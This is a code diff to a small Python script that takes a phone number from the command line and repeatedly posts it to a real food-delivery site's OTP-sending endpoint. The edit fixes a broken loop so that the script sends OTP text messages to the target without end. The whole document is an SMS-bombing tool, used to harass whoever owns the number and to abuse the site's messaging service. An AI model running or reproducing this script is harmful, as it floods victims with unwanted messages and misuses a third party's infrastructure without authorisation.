@@ -19,7 +19,7 @@ def spam():
 	print __banner__
 	param = {'phone_number':''+sys.argv[1]}
 	count = 0
-	while (count == 0)
+	while (count > -1):
 		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
 		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
 			print("\033[1;32m[  OK  ] Send Succesful...Sleep for 1 second...\033[0m")
